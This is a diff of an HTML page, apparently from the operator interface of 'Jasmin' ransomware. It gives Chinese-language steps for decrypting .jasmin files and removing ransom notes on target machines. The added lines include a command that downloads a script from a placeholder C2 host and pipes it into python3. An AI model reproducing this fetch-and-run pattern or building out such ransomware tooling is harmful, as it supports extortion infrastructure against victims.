@@ -7,45 +7,50 @@
 </div>
 
 <div class="dt-content" id="dt-win">
-<h3>Windows 解密</h3>
-<p class="dt-desc">使用 Jasmin Decryptor (WinForms GUI 程序)</p>
-<div class="dt-step"><span>1</span>准备 RSA 私钥文件 <code>jasmin_private.pem</code></div>
-<div class="dt-step"><span>2</span>在目标主机运行 <code>Jasmin Decryptor.exe</code></div>
-<div class="dt-step"><span>3</span>点击图标选择 <code>.pem</code> 私钥文件</div>
-<div class="dt-step"><span>4</span>程序自动扫描所有 <code>.jasmin</code> 文件并验证私钥</div>
-<div class="dt-step"><span>5</span>验证通过后点击 Decrypt 按钮，等待进度条完成</div>
-<div class="dt-step"><span>6</span>解密完成后自动清除勒索提示文件</div>
-<div class="dt-note"><i class="fas fa-shield-alt"></i> SHA256 完整性校验确保每个文件100%还原</div>
-<pre class="dt-code">:: 或使用命令行 (需 .NET 6+)
-cd "Jasmin Decryptor"
-dotnet run -- jasmin_private.pem</pre>
+<h3>🖥️ Windows 解密</h3>
+<p class="dt-desc">GUI方式 (Jasmin Decryptor) 或命令行</p>
+<div class="dt-step"><span>1</span>将 <code>jasmin_private.pem</code> 和 <code>Jasmin_Decryptor.exe</code> 复制到目标机</div>
+<div class="dt-step"><span>2</span>运行 Decryptor → 点击图标选择 .pem 私钥文件</div>
+<div class="dt-step"><span>3</span>验证通过后点击 <b>Decrypt</b>，等待进度条完成</div>
+<div class="dt-step"><span>4</span>解密完成自动清除勒索提示文件</div>
+<div class="dt-note"><i class="fas fa-shield-alt"></i> SHA-256 完整性校验确保每个文件100%还原</div>
+<h4 style="color:var(--accent2);margin-top:16px"><i class="fas fa-terminal"></i> 一键解密命令</h4>
+<pre class="dt-code">:: PowerShell 一键解密 (需先将私钥放在C:\key.pem)
+powershell -c "Get-ChildItem -Recurse -Filter *.jasmin | ForEach { .\Jasmin_Decryptor.exe C:\key.pem $_.FullName }"</pre>
 </div>
 
 <div class="dt-content" id="dt-linux" style="display:none">
-<h3>Linux 解密</h3>
-<p class="dt-desc">使用 jasmin_decrypt.py (Python3)</p>
-<div class="dt-step"><span>1</span>上传私钥和解密脚本到目标主机</div>
-<div class="dt-step"><span>2</span>安装依赖</div>
-<pre class="dt-code">pip3 install cryptography</pre>
-<div class="dt-step"><span>3</span>运行解密（自动扫描 /home /root /var /opt /tmp /srv）</div>
-<pre class="dt-code">python3 jasmin_decrypt.py jasmin_private.pem</pre>
-<div class="dt-step"><span>4</span>指定目录解密</div>
-<pre class="dt-code">python3 jasmin_decrypt.py jasmin_private.pem /home/user /var/www</pre>
-<div class="dt-step"><span>5</span>检查输出：每个文件显示 [+] 成功 或 [-] 失败</div>
-<div class="dt-note"><i class="fas fa-shield-alt"></i> SHA256 校验确保完整还原，失败文件保持 .jasmin 不删除</div>
+<h3>🐧 Linux 解密</h3>
+<p class="dt-desc">使用 jasmin_decrypt.py (Python3 命令行)</p>
+<div class="dt-step"><span>1</span>上传 <code>jasmin_private.pem</code> 和 <code>jasmin_decrypt.py</code> 到目标机</div>
+<div class="dt-step"><span>2</span>安装依赖: <code>pip3 install cryptography</code></div>
+<div class="dt-step"><span>3</span>运行解密 (自动扫描 /home /root /var /opt /tmp /srv)</div>
+<div class="dt-step"><span>4</span>检查输出: [+] 成功 / [-] 失败，失败文件保持 .jasmin 不删</div>
+<div class="dt-note"><i class="fas fa-shield-alt"></i> SHA-256 校验确保完整还原</div>
+<h4 style="color:var(--accent2);margin-top:16px"><i class="fas fa-terminal"></i> 一键解密命令</h4>
+<pre class="dt-code"># 方式1: 全盘解密 (自动扫描默认目录)
+pip3 install cryptography && python3 jasmin_decrypt.py jasmin_private.pem
+
+# 方式2: 指定目录解密
+python3 jasmin_decrypt.py jasmin_private.pem /home/user /var/www /opt/data
+
+# 方式3: 远程一键解密 (从C2下载脚本)
+curl -sL http://YOUR_C2/jasmin_decrypt.py | python3 - jasmin_private.pem</pre>
 </div>
 
 <div class="dt-content" id="dt-mac" style="display:none">
-<h3>macOS 解密</h3>
+<h3>🍎 macOS 解密</h3>
 <p class="dt-desc">与 Linux 相同，使用 jasmin_decrypt.py</p>
-<div class="dt-step"><span>1</span>安装 Python3 和依赖</div>
-<pre class="dt-code">brew install python3
-pip3 install cryptography</pre>
-<div class="dt-step"><span>2</span>运行解密（自动扫描 ~/、/Users、/tmp）</div>
-<pre class="dt-code">python3 jasmin_decrypt.py jasmin_private.pem</pre>
-<div class="dt-step"><span>3</span>指定目录</div>
-<pre class="dt-code">python3 jasmin_decrypt.py jasmin_private.pem ~/Documents /Users/Shared</pre>
-<div class="dt-note"><i class="fas fa-shield-alt"></i> 同样支持 SHA256 完整性校验</div>
+<div class="dt-step"><span>1</span>安装: <code>brew install python3 && pip3 install cryptography</code></div>
+<div class="dt-step"><span>2</span>运行解密 (自动扫描 ~/、/Users、/tmp)</div>
+<div class="dt-step"><span>3</span>可指定目录: <code>python3 jasmin_decrypt.py key.pem ~/Documents</code></div>
+<div class="dt-note"><i class="fas fa-shield-alt"></i> SHA-256 校验确保完整还原</div>
+<h4 style="color:var(--accent2);margin-top:16px"><i class="fas fa-terminal"></i> 一键解密命令</h4>
+<pre class="dt-code"># 全盘解密
+pip3 install cryptography && python3 jasmin_decrypt.py jasmin_private.pem
+
+# 指定目录
+python3 jasmin_decrypt.py jasmin_private.pem ~/Documents /Users/Shared</pre>
 </div>
 
 </section>
